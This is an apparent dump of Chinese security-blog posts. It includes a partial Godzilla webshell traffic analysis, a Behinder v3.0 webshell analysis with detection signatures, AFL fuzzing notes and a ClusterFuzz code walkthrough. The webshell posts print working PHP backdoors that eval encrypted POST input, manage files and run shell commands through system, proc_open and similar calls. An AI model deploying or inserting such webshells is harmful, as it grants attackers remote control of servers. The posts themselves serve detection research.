? &apos;true&apos; : &apos;false&apos;; $data[&apos;CurrentDir&apos;] = str_replace(&apos;\\\\&apos;, &apos;/&apos;, @dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;])); $data[&apos;FileRoot&apos;] = &apos;&apos;; if (substr(__FILE__, 0, 1) != &apos;/&apos;) &#123;foreach (range(&apos;A&apos;, &apos;Z&apos;) as $L)&#123; if (@is_dir(&quot;&#123;$L&#125;:&quot;))&#123; $data[&apos;FileRoot&apos;] .= &quot;&#123;$L&#125;:/;&quot;;&#125;&#125;;&#125;; $data[&apos;FileRoot&apos;] = (strlen(trim($data[&apos;FileRoot&apos;])) &gt; 0 ? $data[&apos;FileRoot&apos;] : &apos;/&apos;); $data[&apos;FileRoot&apos;]= substr_count($data[&apos;FileRoot&apos;],substr(__FILE__, 0, 1))&lt;=0?substr(__FILE__, 0, 1).&quot;:/&quot;:$data[&apos;FileRoot&apos;]; $result=&quot;&quot;; foreach($data as $key=&gt;$value)&#123; $result.=$key.&quot; : &quot;.$value.&quot;\\n&quot;; &#125; return $result;&#125; 接下来说特征，由于有url编码，导致第一次长度变化很大 假如防护设备默认url解码的话，=号后面的base64字符长度是23068，但返回的长度是0，也是非常重要的特征 第一次长度变化很多我们可以检查第二次啊 第二次也是由于url编码导致请求变化，有url解码的话，=号后面的base64字符长度是40，返回包应该不会出现url编码，长度是40 header由于可以自定义，我们就不关注了，通过逆向看源码是从本地数据库读取的，就是用户设置存储到本地的 下面是通过通过JDGUI反编译得到的源码 12345678910111213141516171819202122232425262728293031323334353637private static void initHttpHeader() &#123; String headerString = getGloballHttpHeader(); if (headerString != null) &#123; String[] reqLines = headerString.split(&quot;\\n&quot;); headerMap = new Hashtable&lt;&gt;(); for (int i = 0; i &lt; reqLines.length; i++) &#123; if (!reqLines[i].trim().isEmpty()) &#123; int index = reqLines[i].indexOf(&quot;:&quot;); if (index &gt; 1) &#123; String keyName = reqLines[i].substring(0, index).trim(); String keyValue = reqLines[i].substring(index + 1, reqLines[i].length()).trim(); headerMap.put(keyName, keyValue); &#125; &#125; &#125; &#125; &#125; public static String getGloballHttpHeader() &#123; return Db.getSetingValue(&quot;globallHttpHeader&quot;); &#125; public static String getSetingValue(String key) &#123; String getSetingValueSql = &quot;SELECT value FROM seting WHERE key=?&quot;; try &#123; PreparedStatement preparedStatement = getPreparedStatement(getSetingValueSql); preparedStatement.setString(1, key); ResultSet resultSet = preparedStatement.executeQuery(); String value = resultSet.next() ? resultSet.getString(&quot;value&quot;) : null; resultSet.close(); preparedStatement.close(); return value; &#125; catch (Exception e) &#123; Log.error(e); return null; &#125; &#125; php_xor_raw看完base64的，我们看看php_xor_raw，还是先看webshell文件 123456789101112131415161718192021222324252627282930313233&lt;?phpsession_start();@set_time_limit(0);@error_reporting(0);function E($D,$K)&#123; for($i=0;$i&lt;strlen($D);$i++) &#123; $D[$i] = $D[$i]^$K[$i+1&amp;15]; &#125; return $D;&#125;function Q($D)&#123; return base64_encode($D);&#125;function O($D)&#123; return base64_decode($D);&#125;function I()&#123; return &quot;php://input&quot;;&#125;$V=&apos;payload&apos;;$T=&apos;3c6e0b8a9c15224a&apos;; $F=O(E(file_get_contents(I()),$T)); if (isset($_SESSION[$V]))&#123; $L=$_SESSION[$V]; $A=explode(&apos;|&apos;,$L); class C&#123;public function nvoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; $R=new C(); $R-&gt;nvoke($A[0]); echo E(run($F),$T); &#125;else&#123; $_SESSION[$V]=$F; &#125; 可以看到这里把密码的判断删除了，直接从php://input接收输入（毕竟有不可见字符） php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 流程就不重复说了，跟上面的是一样的 因为这个不存url编码的问题，所以长度是固定的，第一次的HTTP回应包的body也是0，这个比base64更容易检测 前两次的请求长度和响应长度分别如下： 1217300 028 4","categories":[],"tags":[{"name":"webshell","slug":"webshell","permalink":"https://www.giantbranch.cn/tags/webshell/"},{"name":"Godzilla","slug":"Godzilla","permalink":"https://www.giantbranch.cn/tags/Godzilla/"}]},{"title":"冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测","slug":"冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测","date":"2020-08-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/","link":"","permalink":"https://www.giantbranch.cn/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/","excerpt":"","text":"最近特殊时期开始的第一天（20200817），冰蝎的github项目就放出了加密Webshell管理的神器——冰蝎v3.0 Beta 1和2，给检测带来了更大的困难，普通的匹配字符串特征的检测已几乎不可能，下面简单分析一下。 这次最大的变化是去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密码的md5的前16位就是密钥 注：本文只针对当前的最新版冰蝎(Behinder) v3.0 Beta 2，并以PHP WebShell为例，其他的asp，jsp的也是类似的 实验环境控制端：win10 + Behinder_v3.0 Beta 2服务端：Ubuntu 16.04 + Apache + PHP 7.0.33 以shell.php为例的Webshell文件分析1234567891011121314151617181920212223242526272829&lt;?php@error_reporting(0);session_start();if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;)&#123; $key=&quot;e45e329feb5d925b&quot;; $_SESSION[&apos;k&apos;]=$key; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&apos;openssl&apos;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&apos;|&apos;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @call_user_func(new C(),$params);&#125;?&gt; 可以看到，相比冰蝎(Behinder) v2.0.1，去除了动态密钥协商机制，直接写死了key，一个16位的key，这个key是密码的md5得来的。—— 冰蝎(Behinder) v2.0.1的分析可以参考： https://www.giantbranch.cn/2019/10/08/%E5%86%B0%E8%9D%8E%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86WebShell%E7%9A%84%E6%A3%80%E6%B5%8B/ ） 1substr(md5(rebeyond)),0,16) == &quot;e45e329feb5d925b&quot; 所以现在的通信示意图变成下面这样，直接用预设密钥进行加密通信 流量分析通过抓取攻击流量，发现流量都是aes的加密结果 代码流程分析注：通过在webshell中输出传输的明文，再base64解密即可获得下面列出的代码 首次连接下面是点击打开webshell后，共执行了4个代码，后面两个是一样的，实际就算他3个吧 下面是第一个代码 12345678910111213141516171819202122232425@error_reporting(0);function main($content)&#123; $result = array(); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($content); $key = $_SESSION[&apos;k&apos;]; echo encrypt(json_encode($result),$key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&apos;openssl&apos;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$content=&quot;2712cbef-2652-4eee-89b7-9a19d5aa7aaf&quot;;main($content); 可以看到传递给服务器的是一个类似UUID的字符串，之后在main中组装成数组后转为json，再使用AES进行加密（没有openssl才使用异或加密） ，最后输出出来，这一步的目的应该是看看服务器的加密结果是否与加密结果一样，这样既可以检测是否是冰蝎webshell，也可以检测webshell的密码是否正确 注意$content，即类似UUID的字符串（没意外就是UUID），是会变的，但是长度不变，也就是请求包的长度不变，加密后的结果的长度也是固定的，所以返回包的内容的长度也是固定的（php的http响应） 所以特征很明显： 1、第一个请求包的特征为 Content-Length: 1112 （这个长度是php的，jsp的是8940，aspx是7232，v3.0 Beta 2的asp版本的功能还是老版本的，所以asp版本暂无） 2、Header存在Pragma: no-cache 下面看第二个代码 12345678910111213141516171819202122232425262728293031323334353637383940414243error_reporting(0);function main() &#123; ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) &#123; for($i=65;$i&lt;=90;$i++) &#123; $drive=chr($i).&apos;:/&apos;; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;; &#125; &#125; else &#123; $driveList=&quot;/&quot;; &#125; $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION[&apos;k&apos;]; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&apos;openssl&apos;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;main(); 可以看到第二个代码获取了以下几个信息：1、phpinfo的输出2、driveList，windows就是看看有哪些磁盘，linux直接返回”/“3、当前的路径4、通过环境变量PHP_OS获取系统是windows还是linux什么的 最后看下最后一个代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185error_reporting(0);header(&apos;Content-Type: text/html; charset=UTF-8&apos;);function getSafeStr($str)&#123; $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str); $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1); if($s0 == $str)&#123; return $s0; &#125;else&#123; return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str); &#125;&#125;function getgbkStr($str)&#123; $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1); $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str); if($s1 == $str)&#123; return $s1; &#125;else&#123; return iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str); &#125;&#125;function delDir($dir)&#123; $files = array_diff(scandir($dir), array( &apos;.&apos;, &apos;..&apos; )); foreach ($files as $file) &#123; (is_dir(&quot;$dir/$file&quot;)) ? delTree(&quot;$dir/$file&quot;) : unlink(&quot;$dir/$file&quot;); &#125; return rmdir($dir);&#125;function main($mode, $path = &quot;.&quot;, $content = &quot;&quot;, $charset = &quot;&quot;,$newpath)&#123; $path=getgbkStr($path); $result = array(); if ($path == &quot;.&quot;) $path = getcwd(); switch ($mode) &#123; case &quot;list&quot;: $allFiles = scandir($path); $objArr = array(); foreach ($allFiles as $fileName) &#123; $fullPath = $path . $fileName; if (!function_exists(&quot;mb_convert_encoding&quot;)) &#123; $fileName=getSafeStr($fileName); &#125; else &#123; $fileName=mb_convert_encoding($fileName, &apos;UTF-8&apos;, mb_detect_encoding($fileName, &quot;UTF-8,GBK&quot;)); &#125; $obj = array( &quot;name&quot; =&gt; base64_encode($fileName), &quot;size&quot; =&gt; base64_encode(filesize($fullPath)), &quot;lastModified&quot; =&gt; base64_encode(date(&quot;Y-m-d H:i:s&quot;, filemtime($fullPath))) ); $obj[&quot;perm&quot;] = is_readable($fullPath) . &quot;,&quot; . is_writable($fullPath) . &quot;,&quot; . is_executable($fullPath); if (is_file($fullPath)) &#123; $obj[&quot;type&quot;] = base64_encode(&quot;file&quot;); &#125; else &#123; $obj[&quot;type&quot;] = base64_encode(&quot;directory&quot;); &#125; array_push($objArr, $obj); &#125; $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(json_encode($objArr)); echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]); break; case &quot;show&quot;: $contents = file_get_contents($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); if (function_exists(&quot;mb_convert_encoding&quot;)) &#123; if ($charset==&quot;&quot;) &#123; $charset = mb_detect_encoding($contents, array( &apos;GB2312&apos;, &apos;GBK&apos;, &apos;UTF-16&apos;, &apos;UCS-2&apos;, &apos;UTF-8&apos;, &apos;BIG5&apos;, &apos;ASCII&apos; )); &#125; $result[&quot;msg&quot;] = base64_encode(mb_convert_encoding($contents, &quot;UTF-8&quot;, $charset)); &#125; else &#123; if ($charset==&quot;&quot;) &#123; $result[&quot;msg&quot;] = base64_encode(getSafeStr($contents)); &#125; else &#123; $result[&quot;msg&quot;] = base64_encode(iconv($charset, &apos;utf-8//IGNORE&apos;, $contents)); &#125; &#125; $result = encrypt(json_encode($result),$_SESSION[&apos;k&apos;]); echo $result; break; case &quot;download&quot;: if (! file_exists($path)) &#123; header(&apos;HTTP/1.1 404 NOT FOUND&apos;); &#125; else &#123; $file = fopen($path, &quot;rb&quot;); echo fread($file, filesize($path)); fclose($file); &#125; break; case &quot;delete&quot;: if (is_file($path)) &#123; if (unlink($path)) &#123; $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;删除成功&quot;); &#125; else &#123; $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;删除失败&quot;); &#125; &#125; if (is_dir($path)) &#123; delDir($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path.&quot;删除成功&quot;); &#125; echo encrypt(json_encode($result),$_SESSION[&apos;k&apos;]); break; case &quot;create&quot;: $file = fopen($path, &quot;w&quot;); $content = base64_decode($content); fwrite($file, $content); fflush($file); fclose($file); if (file_exists($path) &amp;&amp; filesize($path) == strlen($content)) &#123; $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;上传完成，远程文件大尿:&quot; . $path . filesize($path)); &#125; else &#123; $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;上传失败&quot;); &#125; echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]); break; case &quot;append&quot;: $file = fopen($path, &quot;a+&quot;); $content = base64_decode($content); fwrite($file, $content); fclose($file); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;追加完成，远程文件大尿:&quot; . $path . filesize($path)); echo encrypt(json_encode($result),$_SESSION[&apos;k&apos;]); break; case &quot;rename&quot;: if (rename($path,$newpath)) &#123; $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;重命名完房:&quot; . $newpath); &#125; else &#123; $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;重命名失贿&quot;); &#125; echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]); break; default: break; &#125;&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&apos;openssl&apos;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$mode=&quot;list&quot;;$path=&quot;\\var\\www\\html\\Behinder_v3.0/&quot;;main($mode,$path); 最后这两次代码是列出当前路径的文件 可以看到这个代码有以下功能：1、列目录2、获取文件内容3、下载文件4、删除文件5、写入文件6、向文件追加内容7、重命名文件 命令执行以id命令为例，可以看到跟v2.0是一样的，尝试用各种php执行命令的函数执行命令 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105@error_reporting(0);function getSafeStr($str)&#123; $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str); $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1); if($s0 == $str)&#123; return $s0; &#125;else&#123; return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str); &#125;&#125;function main($cmd)&#123; @set_time_limit(0); @ignore_user_abort(1); @ini_set(&apos;max_execution_time&apos;, 0); $result = array(); $PadtJn = @ini_get(&apos;disable_functions&apos;); if (! empty($PadtJn)) &#123; $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn); $PadtJn = explode(&apos;,&apos;, $PadtJn); $PadtJn = array_map(&apos;trim&apos;, $PadtJn); &#125; else &#123; $PadtJn = array(); &#125; $c = $cmd; if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123; $c = $c . &quot; 2&gt;&amp;1\\n&quot;; &#125; $JueQDBH = &apos;is_callable&apos;; $Bvce = &apos;in_array&apos;; if ($JueQDBH(&apos;system&apos;) and ! $Bvce(&apos;system&apos;, $PadtJn)) &#123; ob_start(); system($c); $kWJW = ob_get_contents(); ob_end_clean(); &#125; else if ($JueQDBH(&apos;proc_open&apos;) and ! $Bvce(&apos;proc_open&apos;, $PadtJn)) &#123; $handle = proc_open($c, array( array( &apos;pipe&apos;, &apos;r&apos; ), array( &apos;pipe&apos;, &apos;w&apos; ), array( &apos;pipe&apos;, &apos;w&apos; ) ), $pipes); $kWJW = NULL; while (! feof($pipes[1])) &#123; $kWJW .= fread($pipes[1], 1024); &#125; @proc_close($handle); &#125; else if ($JueQDBH(&apos;passthru&apos;) and ! $Bvce(&apos;passthru&apos;, $PadtJn)) &#123; ob_start(); passthru($c); $kWJW = ob_get_contents(); ob_end_clean(); &#125; else if ($JueQDBH(&apos;shell_exec&apos;) and ! $Bvce(&apos;shell_exec&apos;, $PadtJn)) &#123; $kWJW = shell_exec($c); &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;exec&apos;, $PadtJn)) &#123; $kWJW = array(); exec($c, $kWJW); $kWJW = join(chr(10), $kWJW) . chr(10); &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;popen&apos;, $PadtJn)) &#123; $fp = popen($c, &apos;r&apos;); $kWJW = NULL; if (is_resource($fp)) &#123; while (! feof($fp)) &#123; $kWJW .= fread($fp, 1024); &#125; &#125; @pclose($fp); &#125; else &#123; $kWJW = 0; $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;); $key = $_SESSION[&apos;k&apos;]; echo encrypt(json_encode($result), $key); return; &#125; $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW)); echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]);&#125;function encrypt($data,$key)&#123; if(!extension_loaded(&apos;openssl&apos;)) &#123; for($i=0;$i&lt;strlen($data);$i++) &#123; $data[$i] = $data[$i]^$key[$i+1&amp;15]; &#125; return $data; &#125; else &#123; return openssl_encrypt($data, &quot;AES128&quot;, $key); &#125;&#125;$cmd=&quot;id&quot;;main($cmd);","categories":[],"tags":[{"name":"webshell","slug":"webshell","permalink":"https://www.giantbranch.cn/tags/webshell/"},{"name":"冰蝎","slug":"冰蝎","permalink":"https://www.giantbranch.cn/tags/冰蝎/"},{"name":"Behinder","slug":"Behinder","permalink":"https://www.giantbranch.cn/tags/Behinder/"}]},{"title":"一个2016年afl的议题记录：BSidesSF 2016 - Fuzz Smarter, Not Harder (An afl-fuzz Primer) (Craig Young)","slug":"一个2016年afl的议题记录：BSidesSF 2016 - Fuzz Smarter, Not Harder (An afl-fuzz Primer) (Craig Young)","date":"2020-05-24T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2020/05/24/一个2016年afl的议题记录：BSidesSF 2016 - Fuzz Smarter, Not Harder (An afl-fuzz Primer) (Craig Young)/","link":"","permalink":"https://www.giantbranch.cn/2020/05/24/一个2016年afl的议题记录：BSidesSF 2016 - Fuzz Smarter, Not Harder (An afl-fuzz Primer) (Craig Young)/","excerpt":"","text":"afl插桩 64kb的共享内存来储存 界面解析 ① Process timing:Fuzzer运行时长、以及距离最近发现的路径、崩溃和挂起经过了多长时间。 ② Overall results：Fuzzer当前状态的概述。 ③ Cycle progress：我们输入队列的距离。 ④ Map coverage：目标二进制文件中的插桩代码所观察到覆盖范围的细节。 ⑤ Stage progress：Fuzzer现在正在执行的文件变异策略、执行次数和执行速度。 ⑥ Findings in depth：有关我们找到的执行路径，异常和挂起数量的信息。 ⑦ Fuzzing strategy yields：关于突变策略产生的最新行为和结果的详细信息。 ⑧ Path geometry：有关Fuzzer找到的执行路径的信息。 ⑨ CPU load：CPU利用率 快速起fuzz的例子 输出路径的文件夹解析 一些问题 优化并行fuzz可以用afl-whatsup &lt;output目录&gt;查看状态 -M进行确定性测试（deterministic ），即对输入文件进行一些特殊而非随机的的变异 -S进行完全随机的变异。 获取cpu的个数 跨系统fuzzhttps://github.com/MartijnB/disfuzz-afl 提升效率llvm模式会更快 持久模式 两者相结合提速2.8倍 大海捞针减少单个输入的大小 移除执行相同代码的输入文件 给字典（关键字） 去掉校验代码 一个开源，一个不开源的同类软件 crash 处理 找到那里导致的崩溃 Sanitizers 作者自己的方法 afl自带的一些工具预处理移除执行相同代码的输入文件——afl-cmin减小单个输入文件的大小——afl-tmin 使用afl-showmap跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况 fuzz状态查看并行fuzz时，afl-whatsup工具可以查看每个fuzzer的运行状态和总体运行概况，加上-s选项只显示概况，其中的数据都是所有fuzzer的总和。 afl-gotcpu工具可以查看每个核心使用状态 afl-plot绘制各种状态指标的直观变化趋势图 崩溃处理afl-fuzz -C - crash exploration mode (the peruvian rabbit thing).AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。 https://github.com/bnagy/crashwalk 工具基于gdb的exploitable插件 afl-collect，它也是afl-utils套件中的一个工具，同样也是基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir – /path/to/target –target-opts 其他人开发的工具 https://gitlab.com/rc0r/afl-utils 代码覆盖率GCOV随gcc一起发布，所以不需要再单独安装，和afl-gcc插桩编译的原理一样，gcc编译时生成插桩的程序，用于在执行时生成代码覆盖率信息。 另外一个工具是LCOV，它是GCOV的图形前端，可以收集多个源文件的gcov数据，并创建包含使用覆盖率信息注释的源代码HTML页面。最后一个工具是afl-cov，可以快速帮助我们调用前面两个工具处理来自afl-fuzz测试用例的代码覆盖率结果。 123456789101112还是以Fuzz libtiff为例，计算Fuzzing过程的代码覆盖率流程如下：第一步，使用gcov重新编译源码，在CFLAGS中添加&quot;-fprofile-arcs&quot;和&quot;-ftest-coverage&quot;选项，可以在--prefix中重新指定一个新的目录以免覆盖之前alf插桩的二进制文件。$ make clean$ ./configure --prefix=/root/tiff-4.0.10/build-cov CC=&quot;gcc&quot; CXX=&quot;g++&quot; CFLAGS=&quot;-fprofile-arcs -ftest-coverage&quot; --disable-shared$ make$ make install第二步，执行afl-cov。其中-d选项指定afl-fuzz输出目录；—live用于处理一个还在实时更新的AFL目录，当afl-fuzz停止时，afl-cov将退出；–enable-branch-coverage用于开启边缘覆盖率（分支覆盖率）统计；-c用于指定源码目录；最后一个-e选项用来设置要执行的程序和参数，其中的AFL_FILE和afl中的”@@”类似，会被替换为测试用例，LD_LIBRARY_PATH则用来指定程序的库文件。$ cd ~/tiff-4.0.10$ afl-cov -d ~/syncdir --live --enable-branch-coverage -c . -e &quot;cat AFL_FILE | LD_LIBRARY_PATH=./build-cov/lib ./build-cov/bin/tiff2pdf AFL_FILE&quot; 参考https://www.youtube.com/watch?v=4IrYczT5YFs","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://www.giantbranch.cn/tags/test/"}]},{"title":"ClusterFuzz的bot源码(fuzz task)阅读","slug":"ClusterFuzz的bot源码(fuzz task)阅读","date":"2020-05-22T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2020/05/22/ClusterFuzz的bot源码(fuzz task)阅读/","link":"","permalink":"https://www.giantbranch.cn/2020/05/22/ClusterFuzz的bot源码(fuzz task)阅读/","excerpt":"","text":"当时阅读时候的版本：ClusterFuzz v2.0.1 总览首先运行bot的入口是python butler.py run_bot 12345678args = parser.parse_args()if not args.command: parser.print_help() return_setup()command = importlib.import_module(&apos;local.butler.%s&apos; % args.command)command.execute(args) 之后执行中的src/local/butler/run_bot.py中的execute 1234567891011121314151617181920def execute(args): &quot;&quot;&quot;Run the bot.&quot;&quot;&quot; appengine_path = appengine.find_sdk_path() _setup_bot_directory(args) _setup_environment_and_configs(args, appengine_path) try: os.chdir(os.path.join(args.directory, &apos;clusterfuzz&apos;)) proc = common.execute_async(&apos;python src/python/bot/startup/run_bot.py&apos;) def _stop_handler(*_): print(&apos;Bot has been stopped. Exit.&apos;) proc.kill() signal.signal(signal.SIGTERM, _stop_handler) common.process_proc_output(proc) proc.wait() except KeyboardInterrupt: _stop_handler() 之后就是执行src/python/bot/startup/run_bot.py，而这里面是有定义main函数的 1234567891011121314151617if __name__ == &apos;__main__&apos;: if sys.version_info.major == 3: # TODO(ochang): Remove check once all migrated to Python 3. multiprocessing.set_start_method(&apos;spawn&apos;) try: with ndb_init.context(): main() exit_code = 0 except Exception: traceback.print_exc() exit_code = 1 monitor.stop() # Prevent python GIL deadlocks on shutdown. See https://crbug.com/744680. os._exit(exit_code) # pylint: disable=protected-access 上面就是一些初始化就执行main函数，我们来看main函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768def main(): &quot;&quot;&quot;Prepare the configuration options and start requesting tasks.&quot;&quot;&quot; logs.configure(&apos;run_bot&apos;) root_directory = environment.get_value(&apos;ROOT_DIR&apos;) if not root_directory: print(&apos;Please set ROOT_DIR environment variable to the root of the source &apos; &apos;checkout before running. Exiting.&apos;) print(&apos;For an example, check init.bash in the local directory.&apos;) return dates.initialize_timezone_from_environment() environment.set_bot_environment() monitor.initialize() if not profiler.start_if_needed(&apos;python_profiler_bot&apos;): sys.exit(-1) fuzzers_init.run() if environment.is_trusted_host(ensure_connected=False): from bot.untrusted_runner import host host.init() if environment.is_untrusted_worker(): # Track revision since we won&apos;t go into the task_loop. update_task.track_revision() from bot.untrusted_runner import untrusted as untrusted_worker untrusted_worker.start_server() assert False, &apos;Unreachable code&apos; while True: # task_loop should be an infinite loop, # unless we run into an exception. error_stacktrace, clean_exit, task_payload = task_loop() ### 这里是核心，task_loop # Print the error trace to the console. if not clean_exit: print(&apos;Exception occurred while running &quot;%s&quot;.&apos; % task_payload) print(&apos;-&apos; * 80) print(error_stacktrace) print(&apos;-&apos; * 80) should_terminate = ( clean_exit or errors.error_in_list(error_stacktrace, errors.BOT_ERROR_TERMINATION_LIST)) if should_terminate: return logs.log_error( &apos;Task exited with exception (payload=&quot;%s&quot;).&apos; % task_payload, error_stacktrace=error_stacktrace) should_hang = errors.error_in_list(error_stacktrace, errors.BOT_ERROR_HANG_LIST) if should_hang: logs.log(&apos;Start hanging forever.&apos;) while True: # Sleep to avoid consuming 100% of CPU. time.sleep(60) # See if our run timed out, if yes bail out. if data_handler.bot_run_timed_out(): return # Clear the current exception. utils.exc_clear() 看到task_loop()函数，task = tasks.get_task()获取任务，commands.process_command(task)执行命令并删除任务 12345678910111213141516171819202122232425262728293031323334353637383940def task_loop(): &quot;&quot;&quot;Executes tasks indefinitely.&quot;&quot;&quot; clean_exit = False while True: exception_occurred = False task = None # This caches the current environment on first run. Don&apos;t move this. environment.reset_environment() try: # Run regular updates. update_task.run() update_task.track_revision() task = tasks.get_task() ### 获取从任务 if not task: continue with _Monitor(task): with task.lease(): # Execute the command and delete the task. commands.process_command(task) # 执行命令并删除任务 except SystemExit as e: exception_occurred = True clean_exit = (e.code == 0) if not clean_exit and not isinstance(e, untrusted.HostException): logs.log_error(&apos;SystemExit occurred while working on task.&apos;) except commands.AlreadyRunningError: exception_occurred = False except Exception: logs.log_error(&apos;Error occurred while working on task.&apos;) exception_occurred = True if exception_occurred: # Prevent looping too quickly. See: crbug.com/644830 failure_wait_interval = environment.get_value(&apos;FAIL_WAIT&apos;) time.sleep(utils.random_number(1, failure_wait_interval)) break task_payload = task.payload() if task else None return traceback.format_exc(), clean_exit, task_payload 获取任务我们先看get_task函数，可以看这里除了fuzz的任务，还有其他任务 1234567891011121314151617181920212223242526272829def get_task(): &quot;&quot;&quot;Get a task.&quot;&quot;&quot; task = get_command_override() if task: return task # TODO(unassigned): Remove this hack. if environment.get_value(&apos;ML&apos;): return get_regular_task(queue=ML_JOBS_TASKQUEUE) allow_all_tasks = not environment.get_value(&apos;PREEMPTIBLE&apos;) if allow_all_tasks: # Check the high-end jobs queue for bots with 